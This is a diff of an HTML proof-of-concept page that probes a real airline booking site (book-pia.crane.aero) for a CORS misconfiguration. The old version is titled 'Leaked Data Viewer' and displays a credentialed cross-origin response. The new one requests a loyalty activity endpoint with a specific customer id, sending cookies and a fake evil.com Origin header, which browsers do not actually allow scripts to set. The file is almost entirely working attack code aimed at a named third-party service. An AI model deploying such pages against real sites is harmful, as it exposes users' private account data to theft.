@@ -3,24 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Leaked Data Viewer</title>
+    <title>CORS Test</title>
 </head>
 <body>
-    <h1>Leaked Data from book-pia.crane.aero</h1>
-    <pre id="output">Fetching data...</pre>
+    <h1>CORS Exploit Test</h1>
+    <button onclick="testCORS()">Test CORS</button>
+    <p id="result"></p>
 
     <script>
-        fetch("https://book-pia.crane.aero/ibe/search/portGroups", {
-            method: "GET",
-            credentials: "include"
-        })
-        .then(response => response.text())
-        .then(data => {
-            document.getElementById("output").innerText = data;
-        })
-        .catch(error => {
-            document.getElementById("output").innerText = "Error: " + error;
-        });
+        function testCORS() {
+            fetch("https://book-pia.crane.aero/ibe/loyalty/myActivity?_cid=dbf65053-b489-4e5f-9d9b-3798f6df122e", {
+                method: "GET",
+                credentials: "include", // Include cookies for testing
+                headers: {
+                    "Origin": "https://evil.com" // Fake origin
+                }
+            })
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById("result").innerText = "✅ CORS is misconfigured! Response received.";
+                    console.log("Response Headers:", response.headers);
+                } else {
+                    document.getElementById("result").innerText = "❌ CORS blocked the request.";
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                document.getElementById("result").innerText = "❌ Request blocked by CORS.";
+            });
+        }
     </script>
 </body>
 </html>
